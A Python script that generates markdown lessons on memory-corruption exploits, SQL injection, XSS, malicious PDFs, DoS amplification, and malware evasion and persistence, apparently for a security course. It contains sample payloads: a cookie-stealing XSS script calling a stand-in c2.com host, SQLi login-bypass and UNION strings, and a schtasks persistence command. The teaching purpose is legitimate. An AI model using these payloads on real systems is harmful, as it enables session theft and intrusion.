#!/usr/bin/env python3
"""
Generator for Modules 5 to 7 of the Cyber Security Essentials & Linux Security Guide.
"""

import os

os.makedirs("cyber-security/modules", exist_ok=True)

module5_content = """# Module 5: Software Vulnerabilities & Memory Corruption Exploitation

## 5.1 The x86 / x86_64 Process Memory Architecture & Stack Mechanics

To understand binary exploitation, one must first master the memory organization of an executing process. Under modern virtual memory architectures, each 32-bit or 64-bit process operates within its own flat virtual address space partitioned into distinct functional segments:

```
Low Memory Addresses:  0x00000000 (32-bit) / 0x0000000000000000 (64-bit)
+---------------------------------------------------------------------------------+
| .text Segment    | Read-Only, Executable instructions (Machine code)           |
+------------------+--------------------------------------------------------------+
| .data Segment    | Read-Write, Initialized global & static variables            |
+------------------+--------------------------------------------------------------+
| .bss Segment     | Read-Write, Uninitialized global & static variables (Zeroed) |
+------------------+--------------------------------------------------------------+
| Heap Segment     | Dynamically allocated memory (malloc/free, new/delete)       |
|                  | Grows upwards toward higher memory addresses                 |
|                  |                       |                                      |
|                  |                       v                                      |
+------------------+--------------------------------------------------------------+
|                  |                   Unallocated Space                          |
+------------------+--------------------------------------------------------------+
|                  |                       ^                                      |
|                  |                       |                                      |
| Stack Segment    | Local variables, function parameters, saved frame pointers   |
|                  | Grows downwards toward lower memory addresses                |
+---------------------------------------------------------------------------------+
High Memory Addresses: 0xFFFFFFFF (32-bit) / 0x7FFFFFFFFFFFFFFF (64-bit User Space)
```

### The Call Stack & Function Activation Records (Stack Frames)
When a thread invokes a function, a dedicated **Stack Frame** is allocated on the stack to maintain local state. The stack's growth and contraction are governed by CPU registers:
- **Stack Pointer (`ESP` / `RSP`)**: Points to the top (lowest memory address) of the active stack frame.
- **Base / Frame Pointer (`EBP` / `RBP`)**: Points to the base of the current stack frame, serving as a stable reference anchor from which local variables and incoming parameters are accessed via fixed offsets.
- **Instruction Pointer (`EIP` / `RIP`)**: Points to the memory address of the next machine instruction to be executed by the processor.

```mermaid
graph TD
    subgraph Stack_Frame_Anatomy["Standard x86 Function Call Stack Frame"]
        direction TB
        
        HighMem["Higher Memory Addresses (Pushed First)"]
        Arg2["Function Argument 2: [EBP + 12]"]
        Arg1["Function Argument 1: [EBP + 8]"]
        RetAddr["SAVED RETURN ADDRESS (Saved EIP): [EBP + 4]<br/>(Address in caller to resume execution after RET)"]
        SavedEBP["SAVED FRAME POINTER (Saved EBP): [EBP + 0]<br/>(Points to caller's stack frame base)"]
        LocalVar1["Local Variable 1: [EBP - 4]"]
        LocalBuf["Local Buffer char buf[64]: [EBP - 68] to [EBP - 5]"]
        LowMem["Lower Memory Addresses (ESP points here)"]
        
        HighMem --- Arg2 --- Arg1 --- RetAddr --- SavedEBP --- LocalVar1 --- LocalBuf --- LowMem
    end
    
    style Stack_Frame_Anatomy fill:#fcfcfc,stroke:#34495e,stroke-width:2px;
    style RetAddr fill:#fadbd8,stroke:#e74c3c,stroke-width:2px;
    style SavedEBP fill:#fef9e7,stroke:#f39c12,stroke-width:2px;
    style LocalBuf fill:#ebf5fb,stroke:#2980b9,stroke-width:2px;
```

---

## 5.2 Stack-Based Buffer Overflows

A **Stack-Based Buffer Overflow** occurs when a program writes more data into a stack-allocated buffer than the buffer was dimensioned to hold, without conducting bounds checking (frequently via unsafe C functions such as `strcpy()`, `gets()`, `sprintf()`, or `scanf("%s")`).

Because the stack grows downward (toward lower addresses) while string write operations advance upward (toward higher addresses), writing beyond the buffer bounds overwrites adjacent memory sequentially:
1. First, local variables are corrupted.
2. Next, the **Saved Frame Pointer (`Saved EBP`)** is overwritten.
3. Finally, the **Saved Return Address (`Saved EIP`)** is overwritten!

```mermaid
graph TD
    subgraph Buffer_Overflow_Exploitation["Mechanics of Stack Buffer Overflow Exploitation"]
        direction TB
        
        subgraph Normal_State["1. Normal Stack Frame Before Overflow"]
            Norm_Buf["Buffer: char buf[64]<br/>(Holds 64 bytes of safe data)"]
            Norm_EBP["Saved EBP (4 bytes)"]
            Norm_EIP["Saved EIP: 0x08048450<br/>(Valid return address in caller)"]
            Norm_Buf --- Norm_EBP --- Norm_EIP
        end
        
        subgraph Corrupted_State["2. Corrupted Stack After Malicious Input (100 Bytes)"]
            Bad_Buf["Malicious Payload: NOP Sled<br/>(0x90, 0x90, 0x90, 0x90...)"]
            Shellcode["Embedded Shellcode<br/>(Assembly instructions to spawn /bin/sh)"]
            Junk_EBP["Overwritten EBP: 0x41414141 ('AAAA')"]
            Hijacked_EIP["OVERWRITTEN EIP: 0x08047FC0<br/>(Points directly into NOP Sled / Shellcode!)"]
            Bad_Buf --- Shellcode --- Junk_EBP --- Hijacked_EIP
        end
        
        Normal_State --> Corrupted_State
    end
    
    style Buffer_Overflow_Exploitation fill:#fdfefe,stroke:#2c3e50,stroke-width:2px;
    style Norm_EIP fill:#d4efdf,stroke:#27ae60,stroke-width:2px;
    style Hijacked_EIP fill:#fadbd8,stroke:#e74c3c,stroke-width:2px;
```

### Exploit Anatomy: NOP Sleds & Shellcode
1. **The NOP Sled (`0x90`)**:
   - Because virtual memory addresses can fluctuate slightly due to environment variables or compiler differences, hitting the exact starting byte of the shellcode can be difficult.
   - Attackers prepend a sequence of hundreds of `NOP` (No Operation, `0x90` opcode) instructions before the shellcode. If the hijacked `EIP` lands anywhere within the NOP sled, the processor simply slides down the instructions until it hits the shellcode.
2. **Shellcode Execution**:
   - A compact sequence of raw machine instructions designed to execute a specific objective—typically invoking the `execve("/bin/sh")` system call on Linux or downloading and executing a payload on Windows.
   - *Constraint*: Must avoid "bad characters" such as null bytes (`0x00`), which terminate C strings prematurely.

---

## 5.3 Integer Overflows, Underflows & Signedness Flaws

Integer bugs arise when arithmetic operations produce numerical results that exceed the storage capacity of the assigned integer data type.

```mermaid
graph TD
    subgraph Integer_Overflow_Vulnerability["Integer Overflow Leading to Heap Buffer Overflow"]
        direction TB
        
        Input["User Input: count = 0x40000001 (1,073,741,825 items)<br/>Each item size = 4 bytes"]
        Calc["Multiplication in 32-bit unsigned arithmetic:<br/>allocation_size = count * 4<br/>= 0x40000001 * 4 = 0x100000004"]
        Trunc["32-bit Arithmetic Truncation (Wraparound):<br/>allocation_size = 0x00000004 (Only 4 bytes!)"]
        Malloc["malloc(4) allocates tiny 4-byte buffer"]
        Copy["Loop copies 1,073,741,825 items into 4-byte buffer!<br/>Massive Heap Memory Corruption"]
        
        Input --> Calc --> Trunc --> Malloc --> Copy
    end
    
    style Integer_Overflow_Vulnerability fill:#f9f9f9,stroke:#34495e,stroke-width:2px;
    style Trunc fill:#fef9e7,stroke:#f39c12,stroke-width:2px;
    style Copy fill:#fadbd8,stroke:#e74c3c,stroke-width:2px;
```

### Numerical Edge Cases
1. **Unsigned Integer Overflow (Wraparound)**:
   - For a 32-bit unsigned integer, the maximum value is $2^{32} - 1 = 4,294,967,295$ (`0xFFFFFFFF`). Adding 1 wraps around to `0`.
2. **Signed Integer Overflow & Sign Extension**:
   - In two's complement representation, a 32-bit signed integer interprets `0x7FFFFFFF` as $+2,147,483,647$. Adding 1 yields `0x80000000`, which represents $-2,147,483,648$.
   - If an application performs a bounds check `if (size < MAX_BUF)` where `size` is negative, the check passes, but a subsequent memory copy function expecting an unsigned size interprets the value as an enormous positive integer, corrupting memory.

---

## 5.4 Format String Vulnerabilities

Format string vulnerabilities occur when user-controlled input is passed directly as the format argument to variadic C output functions (such as `printf(user_input)` instead of `printf("%s", user_input)`).

```c
/* Vulnerable Code Example */
char user_input[100];
fgets(user_input, sizeof(user_input), stdin);
printf(user_input); // DANGEROUS: user controls format string!
```

### Exploit Capabilities of Format Specifiers
- **Information Disclosure / Memory Reading (`%x`, `%p`, `%s`)**:
  - The format string parser expects arguments corresponding to each format specifier. If specifiers are provided without corresponding arguments, the parser traverses upward through the stack, printing the contents of stack memory.
  - Passing `%08x.%08x.%08x...` dumps consecutive 32-bit values from the stack, leaking ASLR base addresses, canary values, and sensitive passwords.
  - Passing `%s` treats the value on the stack as a memory pointer, printing the ASCII string located at that arbitrary memory address.
- **Arbitrary Memory Overwrite (`%n`)**:
  - The `%n` format specifier writes the number of characters printed so far into the integer pointer supplied as an argument.
  - By manipulating the field width parameter (e.g., `%1000u%n`), an attacker can write arbitrary numerical values into target memory addresses (such as Global Offset Table - GOT entries), redirecting program execution flow.

---

## 5.5 Race Conditions & Time-of-Check to Time-of-Use (TOCTOU)

A **Race Condition** occurs in multi-threaded or multi-process systems when the correct execution of a program depends on the timing, sequence, or synchronization of uncontrollable events.

A critical subcategory is the **Time-of-Check to Time-of-Use (TOCTOU)** vulnerability:

```mermaid
sequenceDiagram
    autonumber
    participant Attacker as Unprivileged Attacker Process
    participant Victim as Privileged SUID Root Utility
    participant FS as File System (/tmp/target_file)

    Victim->>FS: 1. Time-of-Check: access("/tmp/target_file", W_OK)<br/>(Verifies user has write permissions)
    FS-->>Victim: Access check passes (File is a normal user file)
    
    Note over Attacker,FS: Race Window: Attacker switches file!
    Attacker->>FS: unlink("/tmp/target_file")
    Attacker->>FS: symlink("/etc/shadow", "/tmp/target_file")
    
    Victim->>FS: 2. Time-of-Use: open("/tmp/target_file", O_WRONLY)<br/>(Kernel follows symlink to /etc/shadow!)
    Victim->>FS: Overwrites /etc/shadow with user data!<br/>Attacker gains Root Privileges!
```

### TOCTOU Mechanics
- There is an unavoidable temporal latency (the "race window") between the moment a program **checks** the security state of a resource (e.g., verifying file permissions) and the moment it **uses** the resource (e.g., opening, reading, or writing).
- If an unprivileged concurrent process alters the resource state during this microsecond interval, the privileged program operates on the altered resource under the mistaken assumption that the checked conditions still hold.
- **Defenses**: Using file descriptors and atomic system calls (`open()` with `O_CREAT | O_EXCL`, `fstat()` instead of `stat()`, `openat()` with `O_NOFOLLOW`).

---
"""

module6_content = """# Module 6: Web Application Attacks & Network Denial of Service

## 6.1 SQL Injection (SQLi) Mechanics & Defenses

**SQL Injection (SQLi)** occurs when untrusted user input is directly concatenated into a dynamic database query string without proper sanitization, validation, or parameterization, allowing an attacker to manipulate the underlying database parser.

```mermaid
graph TD
    subgraph SQLi_Pipeline["SQL Injection Query Construction Breakdown"]
        direction TB
        
        Code["Developer Dynamic Query Construction:<br/>query = 'SELECT * FROM users WHERE user=\"' + input_user + '\" AND pass=\"' + input_pass + '\";'"]
        Input["Attacker Input:<br/>input_user = admin' -- <br/>input_pass = irrelevant"]
        Result["Resulting Query Evaluated by SQL Engine:<br/>SELECT * FROM users WHERE user='admin' -- ' AND pass='irrelevant';"]
        Bypass["Parser Interpretation:<br/>1. Compares user == 'admin'<br/>2. Treats '--' as comment delimiter<br/>3. Ignores remaining password verification entirely!"]
        
        Code --> Input --> Result --> Bypass
    end
    
    style SQLi_Pipeline fill:#fdfefe,stroke:#2c3e50,stroke-width:2px;
    style Input fill:#fadbd8,stroke:#e74c3c,stroke-width:2px;
    style Bypass fill:#d4efdf,stroke:#27ae60,stroke-width:2px;
```

### Classification of SQLi Attacks
1. **In-Band (Classic) SQLi**:
   - The attacker uses the same channel to launch the attack and extract results.
   - *Error-Based SQLi*: Intentionally triggers database runtime errors (e.g., divide by zero, type conversion failure) that output sensitive schema or table names in the HTTP response.
   - *UNION-Based SQLi*: Uses the `UNION` operator to append the results of an attacker-crafted query to the original query results:
     ```sql
     ' UNION SELECT null, username, password FROM users --
     ```
2. **Inferential (Blind) SQLi**:
   - The application does not return database error messages or query results directly on the web page.
   - *Boolean-Based Blind*: Injects boolean propositions (e.g., `' AND 1=1 --` vs. `' AND 1=2 --`). Observes differences in page rendering, response lengths, or HTTP status codes to reconstruct data bit-by-bit.
   - *Time-Based Blind*: Injects database delay functions (e.g., `WAITFOR DELAY '0:0:5'` in SQL Server or `pg_sleep(5)` in PostgreSQL). If the page response delays by 5 seconds, the evaluated condition is true.
3. **Out-of-Band SQLi**:
   - Used when blind injection is unviable. The injected query commands the database server to issue external DNS lookups or HTTP requests containing exfiltrated data back to an attacker-controlled server.

### Definitive Defensive Strategy: Prepared Statements
Parameterized queries (Prepared Statements) separate SQL code logic from data literals. The database engine compiles the query template *before* inserting user input:
```python
# SECURE: Prepared Statement with Parameter Binding
cursor.execute("SELECT * FROM users WHERE user = %s AND pass = %s", (input_user, input_pass))
```
Even if `input_user` contains `' OR '1'='1`, the database treats the entire string purely as a literal value for `user`, preventing query structure alteration.

---

## 6.2 Cross-Site Scripting (XSS)

**Cross-Site Scripting (XSS)** is a client-side code injection vulnerability occurring when a web application incorporates untrusted user input into its rendered HTML output without contextual sanitization or encoding, causing the victim's web browser to execute malicious JavaScript.

```mermaid
graph TD
    subgraph XSS_Classification["Taxonomy of Cross-Site Scripting (XSS)"]
        direction TB
        
        subgraph Stored["1. Stored (Persistent) XSS"]
            S_Attacker["Attacker submits payload:<br/><script>fetch('http://c2.com?c='+document.cookie)</script>"]
            S_DB[("Database<br/>(Stores payload in comments/profile)")]
            S_Victim["Victim views page<br/>(Payload fetched from DB & executed)"]
            S_Attacker --> S_DB --> S_Victim
        end
        
        subgraph Reflected["2. Reflected (Non-Persistent) XSS"]
            R_Link["Phishing Link with injected parameter:<br/>http://site.com/search?q=<script>..."]
            R_Server["Web Server reflects query verbatim in HTML response"]
            R_Victim["Victim clicks link; script executes in browser"]
            R_Link --> R_Server --> R_Victim
        end
        
        subgraph DOM["3. DOM-Based XSS"]
            D_Client["Vulnerable Client-Side JavaScript:<br/>document.getElementById('msg').innerHTML = location.hash;"]
            D_Exec["Executed entirely in client DOM without server interaction!"]
            D_Client --> D_Exec
        end
    end
    
    style XSS_Classification fill:#fcfcfc,stroke:#34495e,stroke-width:2px;
    style Stored fill:#ebf5fb,stroke:#2980b9,stroke-width:2px;
    style Reflected fill:#fef9e7,stroke:#f39c12,stroke-width:2px;
    style DOM fill:#fadbd8,stroke:#e74c3c,stroke-width:2px;
```

### Impact & Defenses
- **Exploitation Impact**: Session hijacking (exfiltrating `document.cookie`), credential harvesting, keylogging, keystroke capture, and client-side malware delivery.
- **Defensive Measures**:
  - *Contextual Output Encoding*: HTML entity encoding, JavaScript encoding, attribute encoding.
  - *`HttpOnly` Cookie Flags*: Prevents client-side JavaScript from accessing session cookies via `document.cookie`.
  - *Content Security Policy (CSP)*: HTTP response headers (`Content-Security-Policy: default-src 'self'`) restricting which domains can serve executable scripts and prohibiting inline script execution.

---

## 6.3 Malicious PDF Document Exploitation

Adobe Portable Document Format (PDF) files are not static electronic paper; they are complex document containers supporting embedded fonts, vector graphics, form scripts, embedded Flash/3D models, and dynamic JavaScript execution.

```mermaid
graph TD
    subgraph PDF_Object_Hierarchy["Anatomy of a Malicious PDF File"]
        direction TB
        
        Header["%PDF-1.7 (PDF Header)"]
        Obj1["1 0 obj: Catalog Dictionary"]
        Obj2["2 0 obj: Pages Tree"]
        Obj3["3 0 obj: Page Object"]
        Obj4["4 0 obj: Stream with FlateDecode Compression<br/>(Contains Obfuscated Embedded JavaScript Payload)"]
        Obj5["5 0 obj: OpenAction / Launch Dictionary<br/>(Triggers JavaScript upon Document Open!)"]
        XREF["xref (Cross-Reference Table)"]
        Trailer["trailer << /Root 1 0 R >> %%EOF"]
        
        Header --> Obj1 --> Obj2 --> Obj3
        Obj1 --> Obj5
        Obj5 --> Obj4
        Obj3 --> XREF --> Trailer
    end
    
    style PDF_Object_Hierarchy fill:#f9f9f9,stroke:#34495e,stroke-width:2px;
    style Obj4 fill:#fadbd8,stroke:#e74c3c,stroke-width:2px;
    style Obj5 fill:#fef9e7,stroke:#f39c12,stroke-width:2px;
```

### PDF Exploitation Mechanisms
1. **The `/OpenAction` & `/AA` (Additional Actions) Dictionaries**:
   - Instructs the PDF reader application to automatically execute embedded scripts or external launch commands the instant the document is opened, without requiring user consent.
2. **Stream Obfuscation (`/FlateDecode`, `/ASCIIHexDecode`)**:
   - Attackers compress and encode malicious shellcode or heap-spray scripts within stream objects, defeating basic static keyword scanning.
3. **Heap Spraying via PDF JavaScript**:
   - Embedded JavaScript allocates thousands of memory chunks containing NOP sleds and shellcode across the PDF reader's heap address space.
   - When a subsequent memory corruption vulnerability (such as a use-after-free or buffer overflow in a font rendering engine) is triggered, jumping to an arbitrary heap address reliably hits the sprayed shellcode.

---

## 6.4 Denial of Service (DoS) & Network Amplification Attacks

**Denial of Service (DoS)** attacks aim to render a computing system, application, or network link inaccessible to legitimate users by consuming critical resources (CPU cycles, memory pools, connection state tables, or network link bandwidth).

```mermaid
sequenceDiagram
    autonumber
    participant Attacker as Attacker Botnet
    participant Reflector as Vulnerable Amplification Reflectors<br/>(Open DNS / NTP / Memcached Servers)
    participant Victim as Target Victim Infrastructure

    Attacker->>Reflector: Emits spoofed UDP requests with Victim Source IP<br/>(e.g., DNS 'ANY' Query or NTP 'monlist')<br/>Request Size: 64 Bytes
    Note over Reflector: Reflector processes request & generates massive reply
    Reflector-->>Victim: Floods Victim with Amplified Responses!<br/>Response Size: 3,200 Bytes (50x Amplification!)<br/>Saturates Victim Ingress Bandwidth Completely
```

### Primary DoS / DDoS Mechanisms
1. **TCP SYN Flood**:
   - Exploits the TCP 3-way handshake (`SYN` $\\rightarrow$ `SYN-ACK` $\\rightarrow$ `ACK`).
   - The attacker floods the target with `SYN` packets from spoofed IP addresses.
   - The server allocates a Transmission Control Block (TCB) in its **SYN backlog queue** and responds with `SYN-ACK`. Because the source IP is spoofed, the final `ACK` never arrives.
   - The server's backlog queue fills to capacity, rejecting legitimate incoming connection requests.
   - *Mitigation*: **SYN Cookies** (encodes connection state in the initial TCP sequence number, eliminating the need to allocate memory until the final `ACK` is received).
2. **UDP Reflection & Amplification Attacks**:
   - Exploits connectionless UDP protocols where source IPs can be trivially spoofed.
   - *DNS Amplification*: Requests DNS `ANY` records yielding amplification factors of $20\\times$ to $50\\times$.
   - *NTP Amplification*: Exploits the legacy `monlist` command on NTP servers, returning the addresses of the last 600 clients that queried the server, yielding amplification factors up to $556\\times$.
   - *Memcached Amplification*: Unprotected Memcached servers over UDP yielded amplification factors exceeding $50,000\\times$.

---
"""

module7_content = """# Module 7: Malware Taxonomy, Evasion & Persistence Techniques

## 7.1 Malware Taxonomy: Structural Classifications

Malicious software (malware) encompasses any binary program, script, or firmware payload designed to compromise the confidentiality, integrity, or availability of a computing system without the owner's informed consent.

```mermaid
graph TD
    subgraph Malware_Taxonomy["Malware Structural Taxonomy"]
        direction TB
        
        Virus["1. Virus<br/>• Self-replicating parasitic code<br/>• Requires human action to execute (infects host files)"]
        Worm["2. Worm<br/>• Autonomous self-replicating program<br/>• Propagates over network via unpatched exploits"]
        Trojan["3. Trojan Horse<br/>• Masquerades as legitimate software<br/>• Carries concealed malicious payload"]
        Spyware["4. Spyware / Keylogger<br/>• Covertly monitors user activity<br/>• Exfiltrates keystrokes, credentials, screen captures"]
        Ransomware["5. Ransomware<br/>• Encrypts user files using asymmetric crypto<br/>• Demands cryptocurrency payment for decryption keys"]
        
        Virus --- Worm --- Trojan --- Spyware --- Ransomware
    end
    
    style Malware_Taxonomy fill:#fdfefe,stroke:#2c3e50,stroke-width:2px;
    style Virus fill:#ebf5fb,stroke:#2980b9,stroke-width:2px;
    style Worm fill:#fadbd8,stroke:#e74c3c,stroke-width:2px;
    style Trojan fill:#fef9e7,stroke:#f39c12,stroke-width:2px;
    style Ransomware fill:#f4ecf7,stroke:#8e44ad,stroke-width:2px;
```

### Detailed Structural Profiles
1. **Viruses**:
   - Parasitic code that inserts itself into legitimate executable files (`.exe`, `.dll`) or document macros.
   - *File Infectors*: Overwrite code sections or append code to the end of PE files, modifying the entry point in the PE header to jump to the virus code first before returning to legitimate code.
2. **Worms (e.g., Morris, Code Red, WannaCry)**:
   - Self-contained, autonomous malware that replicates across networks without human intervention.
   - Scans subnets for vulnerable exposed services (e.g., SMB vulnerability MS17-010 in WannaCry), executes remote shellcode, transfers its payload, and spawns new scanning threads.
3. **Trojans**:
   - Disguised as helpful utilities (PDF converters, game cracks, system optimizers). Contains a hidden payload, often a Remote Access Trojan (RAT) providing reverse command shells, webcam access, and file exfiltration.

---

## 7.2 Evasion & Code Obfuscation: Packers, Crypters & Polymorphism

To evade static signature-based detection deployed by Antivirus (AV) and Intrusion Detection Systems (IDS), malware authors employ sophisticated cryptographic and structural transformations.

```mermaid
graph TD
    subgraph Obfuscation_Evolution["Evolution of Malware Code Obfuscation"]
        direction TB
        
        subgraph Static_Signature["1. Plain Malware"]
            PlainCode["Plain Machine Code (Static Hash / Byte Signatures Match)"]
        end
        
        subgraph Packed_Binary["2. Packed / Crypt Encrypted Binary"]
            Stub["Unpacking Stub (Plaintext)"]
            Compressed["Encrypted / Compressed Payload Blob"]
            Stub -->|Decrypts at Runtime in RAM| Execution["Executes Payload in Memory"]
        end
        
        subgraph Polymorphic["3. Polymorphic Malware Engine"]
            PolyStub["Constantly Mutating Decryption Stub<br/>(Junk instructions, register swaps)"]
            PolyBody["Encrypted Body (Different Key per Infection)"]
            PolyStub -->|Decrypts with New Key| PolyExec["Executes Payload"]
        end
        
        subgraph Metamorphic["4. Metamorphic Malware Engine (No Decryption Stub!)"]
            MetaEngine["Mutation Engine completely rewrites body on every replication:<br/>• Instruction Substitution (add eax, 1 <-> inc eax)<br/>• Register Renaming<br/>• Code Transposition (Junk JMPs)"]
        end
        
        Static_Signature --> Packed_Binary --> Polymorphic --> Metamorphic
    end
    
    style Obfuscation_Evolution fill:#f9f9f9,stroke:#34495e,stroke-width:2px;
    style Static_Signature fill:#fadbd8,stroke:#e74c3c,stroke-width:2px;
    style Packed_Binary fill:#fef9e7,stroke:#f39c12,stroke-width:2px;
    style Polymorphic fill:#ebf5fb,stroke:#2980b9,stroke-width:2px;
    style Metamorphic fill:#d4efdf,stroke:#27ae60,stroke-width:2px;
```

### Obfuscation Architectures
1. **Packers & Crypters (e.g., UPX, custom packers)**:
   - The original PE executable is compressed or encrypted and embedded as raw data inside a new PE binary.
   - At runtime, a lightweight **unpacking stub** allocates memory (`VirtualAlloc`), decrypts the original binary into memory, resolves import tables, and transfers execution to the unpacked entry point.
2. **Polymorphic Malware**:
   - The body of the malware is encrypted with a unique symmetric key for every infected file.
   - The decryption stub itself is mutated using a **polymorphic engine**: swapping registers, inserting dead code (`NOP`, `sub eax, 0`), and substituting equivalent instructions, altering the byte signature on every iteration.
3. **Metamorphic Malware**:
   - The most complex obfuscation form. Metamorphic malware completely disassembles, rewrites, and reassembles its own machine code without utilizing encryption stubs.
   - Every generation looks entirely different at the assembly level while remaining semantically identical in behavior.

---

## 7.3 Anti-Analysis, Anti-Debugging & Virtual Machine Detection

Modern security defenses analyze suspicious files inside automated sandbox environments (e.g., Cuckoo Sandbox, Any.Run) running inside virtual machines. Malware incorporates defensive checks to detect analysis environments and terminate execution or alter behavior.

```mermaid
graph TD
    subgraph Anti_Analysis_Checks["Malware Evasion & Environment Detection Flowchart"]
        direction TB
        
        Start["Malware Execution Starts"]
        
        subgraph Checks["Evasion Checks"]
            Check1{"IsDebuggerPresent() or<br/>PEB.BeingDebugged == 1?"}
            Check2{"CPUID Hypervisor Bit Set or<br/>MAC Vendor == VMware/VirtualBox?"}
            Check3{"Artifact Check:<br/>Registry Keys / Sandbox Drivers Present?"}
            Check4{"Human Interaction Check:<br/>Mouse Movement / Cursor Distance > 0?"}
        end
        
        Start --> Check1
        Check1 -->|YES: Debugger Detected| Benign["Execute Benign Dummy Behavior<br/>(Exit Program Immediately)"]
        Check1 -->|NO| Check2
        Check2 -->|YES: VM Detected| Benign
        Check2 -->|NO| Check3
        Check3 -->|YES: Sandbox Detected| Benign
        Check3 -->|NO| Check4
        Check4 -->|NO: Headless Sandbox| Benign
        Check4 -->|YES: Real Human Workstation| Malicious["Deploy Real Malicious Payload<br/>(Decrypt C2, Exfiltrate Data)"]
    end
    
    style Anti_Analysis_Checks fill:#fdfefe,stroke:#2c3e50,stroke-width:2px;
    style Benign fill:#d4efdf,stroke:#27ae60,stroke-width:2px;
    style Malicious fill:#fadbd8,stroke:#e74c3c,stroke-width:2px;
```

### Detection Methodologies
1. **Anti-Debugging Techniques**:
   - *PEB BeingDebugged Flag*: Inspects the Process Environment Block (`fs:[0x30]` on x86). If `BeingDebugged == 1`, a debugger is attached.
   - *`CheckRemoteDebuggerPresent()`*: Win32 API invoking kernel debug queries.
   - *Hardware Breakpoint Detection*: Inspects debug registers (`DR0`–`DR3`) using `GetThreadContext()`.
   - *RDTSC Timing Checks*: Executes the `RDTSC` (Read Time-Stamp Counter) instruction before and after a code block. If execution takes millions of cycles (due to an analyst single-stepping through instructions), the malware halts.
2. **Virtual Machine & Sandbox Detection**:
   - *Hypervisor Artifacts*: Scans the file system for sandbox drivers (`vmmouse.sys`, `vboxguest.sys`) and registry keys (`HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier` containing "VBOX" or "VMware").
   - *CPUID Hypervisor Signature*: Emits the `CPUID` instruction with `EAX=1`. If bit 31 of `ECX` is set, a hypervisor is present. Emitting `CPUID` with `EAX=0x40000000` returns vendor strings like "VMwareVMware", "Microsoft Hv", or "KVMKVMKVM".
   - *Human Interaction Verification*: Automated analysis sandboxes typically execute samples for 2 to 5 minutes with zero mouse movement. Malware sleeps for 20 minutes (`Sleep()`) or verifies that the mouse cursor moves at least 200 pixels before detonating.

---

## 7.4 System Persistence Mechanisms

To ensure survival across operating system reboots and user logoffs, malware anchors itself into persistent operating system structures:

```
Persistence Mechanisms across the Operating System Spectrum:
+---------------------------------------------------------------------------------+
| Persistence Layer   | Implementation & Location                                 |
+---------------------+-----------------------------------------------------------+
| Firmware / Hardware | UEFI / BIOS Flash Infection (SPI flash bootkits)          |
| Hypervisor Layer    | Rogue Hypervisor beneath host OS (Type 0 persistence)     |
| Windows Registry    | HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run   |
|                     | HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run   |
|                     | HKLM\\System\\CurrentControlSet\\Services (Driver setup)  |
| Windows Services    | Service Control Manager (SCM) background system service   |
| Scheduled Tasks     | schtasks /create /tn "SecurityUpdate" /tr "malware.exe"   |
| Startup Folders     | %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup|
| WMI Event Filters   | WMI permanent event subscription (__EventFilter)          |
| DLL Hijacking       | Replacing legitimate DLL in application loading search path|
+---------------------------------------------------------------------------------+
```

---
"""

with open("cyber-security/modules/module5.md", "w") as f:
    f.write(module5_content.strip() + "\n")

with open("cyber-security/modules/module6.md", "w") as f:
    f.write(module6_content.strip() + "\n")

with open("cyber-security/modules/module7.md", "w") as f:
    f.write(module7_content.strip() + "\n")

print("Generated Modules 5 to 7 successfully.")
